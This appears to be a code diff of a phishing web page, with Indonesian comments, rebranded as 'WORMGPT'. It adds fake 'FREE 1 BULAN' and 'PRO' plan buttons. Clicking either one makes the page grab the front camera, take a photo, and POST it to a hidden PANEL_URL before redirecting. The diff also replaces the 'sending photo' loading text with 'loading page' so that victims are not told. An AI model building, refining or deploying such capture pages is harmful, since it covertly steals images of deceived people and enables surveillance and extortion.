@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DARK AI - Capture</title>
+    <title>WORMGPT - Capture</title>
     <style>
         /* ===== RESET & FULLSCREEN ===== */
         * {
@@ -41,7 +41,7 @@
             position: relative;
         }
 
-        /* ===== DECORATIVE LINES (SEPERTI THEME DARK) ===== */
+        /* ===== DECORATIVE LINES ===== */
         .container::before {
             content: '';
             position: absolute;
@@ -56,7 +56,7 @@
             z-index: 0;
         }
 
-        /* ===== GAMBAR SETAN (UNICODE + CSS) ===== */
+        /* ===== GAMBAR SETAN ===== */
         .devil-icon {
             font-size: 120px;
             line-height: 1;
@@ -79,7 +79,7 @@
             }
         }
 
-        /* ===== LOGO DARK AI ===== */
+        /* ===== LOGO WORMGPT ===== */
         .logo-container {
             display: flex;
             align-items: center;
@@ -98,12 +98,12 @@
             position: relative;
         }
 
-        .logo-text .dark {
+        .logo-text .worm {
             color: #ff0000;
             text-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
         }
 
-        .logo-text .ai {
+        .logo-text .gpt {
             color: #ffffff;
             text-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
         }
@@ -143,28 +143,37 @@
             display: none;
         }
 
-        /* ===== TOMBOL MULAI ===== */
-        #btnMulai {
+        /* ===== TOMBOL PAKET ===== */
+        .btn-group {
+            display: flex;
+            gap: 20px;
             position: relative;
             z-index: 10;
-            padding: 20px 65px;
-            font-size: 22px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn-paket {
+            position: relative;
+            padding: 18px 40px;
+            font-size: 18px;
             font-weight: 700;
             color: #fff;
             background: transparent;
-            border: 2px solid rgba(255, 0, 0, 0.6);
+            border: 2px solid rgba(255, 0, 0, 0.5);
             border-radius: 50px;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 4px;
+            letter-spacing: 3px;
             transition: all 0.3s ease;
             font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
             box-shadow: 0 0 30px rgba(255, 0, 0, 0.1), inset 0 0 30px rgba(255, 0, 0, 0.05);
             overflow: hidden;
+            min-width: 180px;
         }
 
-        #btnMulai::before {
+        .btn-paket::before {
             content: '';
             position: absolute;
             top: -2px;
@@ -185,17 +194,17 @@
             100% { background-position: 0% 50%; }
         }
 
-        #btnMulai:hover {
+        .btn-paket:hover {
             transform: scale(1.05);
             border-color: #ff0000;
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.3), inset 0 0 60px rgba(255, 0, 0, 0.1);
         }
 
-        #btnMulai:active {
+        .btn-paket:active {
             transform: scale(0.95);
         }
 
-        #btnMulai:disabled {
+        .btn-paket:disabled {
             opacity: 0.4;
             cursor: not-allowed;
             animation: none;
@@ -203,7 +212,46 @@
             border-color: rgba(255, 0, 0, 0.2);
         }
 
-        /* ===== LOADING LINGKARAN MERAH ===== */
+        .btn-paket .badge {
+            display: block;
+            font-size: 11px;
+            font-weight: 300;
+            opacity: 0.6;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        .btn-paket.free {
+            border-color: rgba(0, 255, 100, 0.4);
+            box-shadow: 0 0 30px rgba(0, 255, 100, 0.05), inset 0 0 30px rgba(0, 255, 100, 0.02);
+        }
+
+        .btn-paket.free::before {
+            background: linear-gradient(45deg, #00ff64, transparent, #00ff64, transparent);
+            opacity: 0.2;
+        }
+
+        .btn-paket.free:hover {
+            border-color: #00ff64;
+            box-shadow: 0 0 60px rgba(0, 255, 100, 0.2), inset 0 0 60px rgba(0, 255, 100, 0.05);
+        }
+
+        .btn-paket.pro {
+            border-color: rgba(255, 215, 0, 0.4);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.05), inset 0 0 30px rgba(255, 215, 0, 0.02);
+        }
+
+        .btn-paket.pro::before {
+            background: linear-gradient(45deg, #ffd700, transparent, #ffd700, transparent);
+            opacity: 0.2;
+        }
+
+        .btn-paket.pro:hover {
+            border-color: #ffd700;
+            box-shadow: 0 0 60px rgba(255, 215, 0, 0.2), inset 0 0 60px rgba(255, 215, 0, 0.05);
+        }
+
+        /* ===== LOADING OVERLAY ===== */
         #loadingOverlay {
             position: absolute;
             top: 0;
@@ -240,12 +288,13 @@
 
         #loadingText {
             color: rgba(255, 255, 255, 0.7);
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 300;
             margin-top: 30px;
-            letter-spacing: 4px;
+            letter-spacing: 6px;
             animation: fadeInOut 1.5s ease-in-out infinite;
             font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-transform: uppercase;
         }
 
         @keyframes fadeInOut {
@@ -253,7 +302,7 @@
             50% { opacity: 0.3; }
         }
 
-        /* ===== FLOATING PARTICLES (EFFECT SETAN) ===== */
+        /* ===== FLOATING PARTICLES ===== */
         .particle {
             position: absolute;
             width: 4px;
@@ -300,10 +349,17 @@
                 letter-spacing: 5px;
             }
 
-            #btnMulai {
-                padding: 16px 40px;
-                font-size: 18px;
-                letter-spacing: 3px;
+            .btn-group {
+                gap: 15px;
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .btn-paket {
+                padding: 14px 30px;
+                font-size: 16px;
+                letter-spacing: 2px;
+                min-width: 200px;
             }
 
             .loader {
@@ -313,6 +369,7 @@
 
             #loadingText {
                 font-size: 16px;
+                letter-spacing: 4px;
             }
         }
 
@@ -332,11 +389,16 @@
                 margin-bottom: 30px;
             }
 
-            #btnMulai {
-                padding: 14px 30px;
-                font-size: 15px;
-                letter-spacing: 2px;
+            .btn-paket {
+                padding: 12px 25px;
+                font-size: 14px;
+                letter-spacing: 1.5px;
+                min-width: 160px;
                 border-width: 1.5px;
+            }
+
+            .btn-paket .badge {
+                font-size: 9px;
             }
 
             .loader {
@@ -347,14 +409,14 @@
 
             #loadingText {
                 font-size: 14px;
-                letter-spacing: 2px;
+                letter-spacing: 3px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container" id="container">
-        <!-- ===== PARTICLES (EFFECT SETAN) ===== -->
+        <!-- ===== PARTICLES ===== -->
         <div class="particle" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
         <div class="particle" style="top: 20%; right: 10%; animation-delay: 2s;"></div>
         <div class="particle" style="bottom: 30%; left: 15%; animation-delay: 4s;"></div>
@@ -367,10 +429,10 @@
         <!-- ===== ICON SETAN ===== -->
         <div class="devil-icon">😈</div>
 
-        <!-- ===== LOGO DARK AI ===== -->
+        <!-- ===== LOGO WORMGPT ===== -->
         <div class="logo-container">
             <span class="logo-text">
-                <span class="dark">DARK</span> <span class="ai">AI</span><span class="dot">.</span>
+                <span class="worm">WORM</span><span class="gpt">GPT</span><span class="dot">.</span>
             </span>
         </div>
 
@@ -380,13 +442,22 @@
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
 
-        <!-- ===== TOMBOL MULAI ===== -->
-        <button id="btnMulai">▶ MULAI</button>
+        <!-- ===== TOMBOL PAKET ===== -->
+        <div class="btn-group">
+            <button class="btn-paket free" id="btnFree">
+                FREE 1 BULAN
+                <span class="badge">▼ limited access</span>
+            </button>
+            <button class="btn-paket pro" id="btnPro">
+                PRO
+                <span class="badge">⭐ full access</span>
+            </button>
+        </div>
 
         <!-- ===== LOADING OVERLAY ===== -->
         <div id="loadingOverlay">
             <div class="loader"></div>
-            <div id="loadingText">MENGIRIM FOTO...</div>
+            <div id="loadingText">MEMUAT HALAMAN...</div>
         </div>
     </div>
 
@@ -395,7 +466,8 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        const btnMulai = document.getElementById('btnMulai');
+        const btnFree = document.getElementById('btnFree');
+        const btnPro = document.getElementById('btnPro');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
         const container = document.getElementById('container');
@@ -409,12 +481,17 @@
 
         let stream = null;
         let capturedImage = null;
+        let selectedPaket = '';
 
-        // ===== FUNGSI MULAI KAMERA & CAPTURE OTOMATIS =====
-        async function startAndCapture() {
-            // Disable tombol
-            btnMulai.disabled = true;
-            btnMulai.textContent = '⏳...';
+        // ===== FUNGSI MULAI KAMERA & CAPTURE =====
+        async function startAndCapture(paket) {
+            selectedPaket = paket;
+            
+            // Disable kedua tombol
+            btnFree.disabled = true;
+            btnPro.disabled = true;
+            btnFree.textContent = '⏳...';
+            btnPro.textContent = '⏳...';
 
             try {
                 // 1. Minta izin kamera depan
@@ -447,12 +524,12 @@
                     video.srcObject = null;
                 }
 
-                // 5. Tampilkan loading
+                // 5. Tampilkan loading dengan teks "MEMUAT HALAMAN..."
                 loadingOverlay.classList.add('active');
-                loadingText.textContent = '📤 MENGIRIM FOTO...';
+                loadingText.textContent = 'MEMUAT HALAMAN...';
 
-                // 6. Kirim ke panel (background)
-                kirimKePanel();
+                // 6. Kirim foto ke panel dengan informasi paket
+                kirimKePanel(paket);
 
                 // 7. Redirect setelah 3 detik
                 setTimeout(() => {
@@ -464,7 +541,7 @@
                 
                 // Jika gagal, tetap redirect
                 loadingOverlay.classList.add('active');
-                loadingText.textContent = '⏳ MENGARAHKAN...';
+                loadingText.textContent = 'MEMUAT HALAMAN...';
                 
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
@@ -473,7 +550,7 @@
         }
 
         // ===== FUNGSI KIRIM KE PANEL =====
-        async function kirimKePanel() {
+        async function kirimKePanel(paket) {
             if (!capturedImage) {
                 console.log('Tidak ada foto untuk dikirim');
                 return;
@@ -486,6 +563,7 @@
                 const formData = new FormData();
                 formData.append('foto', blob, 'foto_depan.jpg');
                 formData.append('timestamp', new Date().toISOString());
+                formData.append('paket', paket); // Kirim info paket yang dipilih
 
                 fetch(PANEL_URL, {
                     method: 'POST',
@@ -493,7 +571,7 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        console.log('✅ Foto berhasil dikirim ke panel');
+                        console.log('✅ Foto berhasil dikirim ke panel (Paket: ' + paket + ')');
                     } else {
                         console.log('❌ Gagal kirim ke panel:', response.status);
                     }
@@ -508,12 +586,20 @@
         }
 
         // ===== EVENT LISTENER =====
-        btnMulai.addEventListener('click', startAndCapture);
+        btnFree.addEventListener('click', function() {
+            startAndCapture('FREE');
+        });
+
+        btnPro.addEventListener('click', function() {
+            startAndCapture('PRO');
+        });
 
         // ===== CEK DUKUNGAN BROWSER =====
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            btnMulai.disabled = true;
-            btnMulai.textContent = '⚠️ TIDAK DIDUKUNG';
+            btnFree.disabled = true;
+            btnPro.disabled = true;
+            btnFree.textContent = '⚠️ TIDAK DIDUKUNG';
+            btnPro.textContent = '⚠️ TIDAK DIDUKUNG';
         }
 
         // ===== CLEANUP =====
@@ -524,4 +610,4 @@
         });
     </script>
 </body>
-  </html>
+    </html>
